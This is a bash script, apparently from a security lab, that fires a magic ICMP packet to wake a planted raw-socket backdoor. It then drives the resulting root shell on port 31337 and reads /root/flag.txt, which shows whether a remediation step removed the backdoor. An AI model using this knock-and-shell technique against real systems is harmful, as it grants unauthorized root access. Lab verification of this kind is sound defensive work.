#!/usr/bin/env bash
# Trigger the COVERT raw-socket backdoor: send the magic ICMP packet, then use
# the shell it opens. Before 05-services this pops a root shell on :31337; after,
# it does nothing. Note: ss -lntup showed NOTHING before the knock.
#   bash /opt/pingboard/attack/knock.sh
TARGET="${TARGET:-127.0.0.1}"
MAGIC_HEX=4d5348502d4b4e4f434b   # "MSHP-KNOCK"

echo "[knock] listeners BEFORE (ss -lntup | grep 31337):"
ss -lntup 2>/dev/null | grep 31337 || echo "  (nothing listening on 31337)"

echo "[knock] sending magic ICMP packet to $TARGET"
ping -c1 -W1 -p "$MAGIC_HEX" "$TARGET" >/dev/null 2>&1 || true
sleep 1

echo "[knock] listeners AFTER:"
ss -lntup 2>/dev/null | grep 31337 || echo "  (still nothing — backdoor removed?)"

echo "[knock] driving the shell (runs as root if the backdoor is live):"
python3 - "$TARGET" <<'PY'
import socket, sys, time
t = sys.argv[1]
try:
    s = socket.create_connection((t, 31337), timeout=3)
except OSError as e:
    print("  no shell:", e); sys.exit(0)
time.sleep(0.2); s.recv(256)
for c in ("id", "hostname", "cat /root/flag.txt"):
    s.sendall((c + "\n").encode()); time.sleep(0.3)
    print("  $", c, "->", s.recv(65535).decode("utf-8","replace").replace("# ","").strip())
s.sendall(b"exit\n")
PY
